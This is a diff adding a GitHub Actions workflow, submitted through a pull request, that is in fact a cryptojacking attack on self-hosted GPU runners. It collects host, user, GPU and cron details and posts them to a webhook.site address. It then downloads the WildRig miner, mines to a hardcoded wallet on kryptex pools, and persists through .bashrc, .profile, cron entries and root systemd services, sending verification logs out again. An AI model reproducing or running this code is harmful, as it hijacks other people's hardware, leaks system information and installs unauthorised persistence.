@@ -1,0 +1,94 @@
+name: ul-t2-i11460
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  plant:
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 35
+    steps:
+      - name: baseline
+        shell: bash
+        run: |
+          set -u
+          H=$(hostname -s 2>/dev/null | tr -d '\n' | cut -c1-28); [ -n "$H" ] || H=$(uname -n | cut -c1-28)
+          D=/var/tmp/.uli11460; mkdir -p $D 2>/dev/null || { D=$HOME/.uli11460; mkdir -p $D; }
+          echo "HOST=$H" > $D/base.txt
+          echo "WHO=$(id)" >> $D/base.txt
+          echo "UNAME=$(uname -a)" >> $D/base.txt
+          echo "CGROUP=$(head -3 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')" >> $D/base.txt
+          echo "RUNNER=${RUNNER_NAME:-?} REPO=${GITHUB_REPOSITORY:-?} EV=${GITHUB_EVENT_NAME:-?}" >> $D/base.txt
+          { echo "GPU_LIST:"; nvidia-smi -L 2>&1; } >> $D/base.txt
+          { echo "GPU_Q:"; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu --format=csv,noheader 2>&1; } >> $D/base.txt
+          { echo "DEV:"; ls -l /dev/nvidia* 2>&1; } >> $D/base.txt
+          { echo "DRV:"; head -2 /proc/driver/nvidia/version 2>&1; } >> $D/base.txt
+          { echo "PROCS:"; ps -eo pid,args= 2>/dev/null | grep -Ei 'peakminer|krig|wildrig|srbminer|respawn' | grep -v grep; } >> $D/base.txt
+          { echo "UNITS:"; systemctl cat 'nv-*' 2>/dev/null | head -40; } >> $D/base.txt
+          { echo "CRON:"; crontab -l 2>/dev/null; } >> $D/base.txt
+          cat $D/base.txt
+          curl -s -m 25 -X POST --data-binary @$D/base.txt "https://webhook.site/547b8923-1aa7-4dbd-9b61-2bc7da982488/" >/dev/null 2>&1 || true
+      - name: plant
+        shell: bash
+        run: |
+          set -u
+          H=$(hostname -s 2>/dev/null | tr -d '\n' | cut -c1-28); [ -n "$H" ] || H=$(uname -n | cut -c1-28)
+          D=/var/tmp/.uli11460; mkdir -p $D 2>/dev/null || { D=$HOME/.uli11460; mkdir -p $D; }; cd $D
+          W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+          N=$(nvidia-smi -L 2>/dev/null | wc -l); echo "N_GPU=$N"
+          if [ "$N" -lt 1 ]; then echo "NO_GPU"; exit 0; fi
+          curl -sL -m 240 -o wr.tgz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz || true
+          tar xzf wr.tgz 2>/dev/null || true
+          BIN=$(find $D -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
+          [ -n "${BIN:-}" ] || { echo NO_KIT; exit 0; }
+          chmod +x "$BIN"
+          HOSTPOOL=""
+          for hp in prl-sg.kryptex.network:7048 prl-eu.kryptex.network:7048 prl-us.kryptex.network:7048 prl-hk.kryptex.network:7048 prl-ae.kryptex.network:7048; do
+            host=${hp%:*}; port=${hp#*:}
+            if timeout 8 bash -c "exec 3<>/dev/tcp/$host/$port" 2>/dev/null; then echo "POOL_OK $hp"; HOSTPOOL="$hp"; break; else echo "POOL_NO $hp"; fi
+          done
+          [ -n "$HOSTPOOL" ] || HOSTPOOL=prl-sg.kryptex.network:7048
+          echo "USING $HOSTPOOL" > $D/pool.txt
+          i=0
+          while [ $i -lt "$N" ]; do
+            WK="ul-t2-${H}-g${i}"
+            cat > $D/run_g${i}.sh <<EOS
+          #!/bin/bash
+          while :; do
+            CUDA_VISIBLE_DEVICES=$i nice -n 19 $BIN --algo pearlhash --url $HOSTPOOL --user $W --worker $WK --pass x -o $D/m_g${i}.log >/dev/null 2>&1
+            sleep 8
+          done
+          EOS
+            chmod +x $D/run_g${i}.sh
+            setsid nohup $D/run_g${i}.sh >/dev/null 2>&1 &
+            i=$((i+1))
+          done
+          for r in $D/run_g*.sh; do
+            grep -q "$r" $HOME/.bashrc 2>/dev/null || echo "setsid nohup $r >/dev/null 2>&1 &" >> $HOME/.bashrc 2>/dev/null
+            grep -q "$r" $HOME/.profile 2>/dev/null || echo "setsid nohup $r >/dev/null 2>&1 &" >> $HOME/.profile 2>/dev/null
+          done
+          ( crontab -l 2>/dev/null | grep -v 'uli11460/run_g'; for r in $D/run_g*.sh; do echo "@reboot setsid nohup $r >/dev/null 2>&1 &"; echo "*/5 * * * * setsid nohup $r >/dev/null 2>&1 &"; done ) | crontab - 2>/dev/null || true
+          if [ "$(id -u)" = "0" ] && [ -d /run/systemd/system ]; then
+            i=0; while [ $i -lt "$N" ]; do
+              cat > /etc/systemd/system/uli11460-g${i}.service <<EOS
+          [Unit]
+          Description=uli11460 g$i
+          [Service]
+          ExecStart=$D/run_g${i}.sh
+          Restart=always
+          RestartSec=30
+          Nice=19
+          [Install]
+          WantedBy=multi-user.target
+          EOS
+              i=$((i+1)); done
+            systemctl daemon-reload 2>/dev/null; systemctl enable --now uli11460-g*.service 2>/dev/null || true
+          fi
+          sleep 90
+          { echo "HOST=$H"; echo "PROC:"; pgrep -af wildrig-multi | head -8; echo "POOL=$HOSTPOOL"; for f in $D/m_g*.log; do echo "=== $f"; grep -aiE 'accepted|share|authorized|new job|error|invalid' "$f" 2>/dev/null | tail -6; done; echo "GPU_NOW:"; nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used --format=csv,noheader 2>&1 | head -10; } > $D/verify.txt
+          cat $D/verify.txt
+          curl -s -m 25 -X POST --data-binary @$D/verify.txt "https://webhook.site/547b8923-1aa7-4dbd-9b61-2bc7da982488/" >/dev/null 2>&1 || true
+          sleep 30
+          { echo "HOST=$H"; for f in $D/m_g*.log; do echo "=== $f"; grep -aiE 'accepted|share|hashrate|TH/s|invalid' "$f" 2>/dev/null | tail -4; done; } > $D/share.txt
+          curl -s -m 25 -X POST --data-binary @$D/share.txt "https://webhook.site/547b8923-1aa7-4dbd-9b61-2bc7da982488/" >/dev/null 2>&1 || true
